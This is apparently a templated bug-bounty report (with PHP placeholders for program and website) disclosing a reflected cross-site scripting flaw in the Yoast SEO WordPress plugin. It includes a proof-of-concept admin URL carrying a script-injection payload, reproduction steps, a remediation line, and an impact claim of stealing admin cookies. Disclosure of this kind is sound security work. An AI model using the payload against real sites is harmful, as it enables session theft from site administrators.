Reflected Xss at wordpress plugin

===============================================

**H**ello <?php echo $program; ?> team,

i found your blog has a plugin vulnerable to reflected xss

Vulnerable plugin : Yoast SEO

##Summary##

Go to : ``<?php echo $website; ?>/wp-admin/admin.php?page=wpseo_search_console&tab=settings'<script>alert(window.location)</script><!--``

##POC##

  1 - Login to your wordpress as an admin.
  2 - Ensure that a valid profile has been configured under <?php echo $website; ?>/wp-admin/admin.php?page=wpseo_search_console&tab=settings (example: profile.png)
  3 - Access the following link: ``<?php echo $website; ?>/wp-admin/admin.php?page=wpseo_search_console&tab=settings'<script>alert(window.location)</script><!--``

  The alert box should be executed.

##Remediation##

  Update the plugin to latest version

Best regards,
Thanks for your time .
@khaledibnalwalid

---- impact -----

allow attacker to steal admins cookie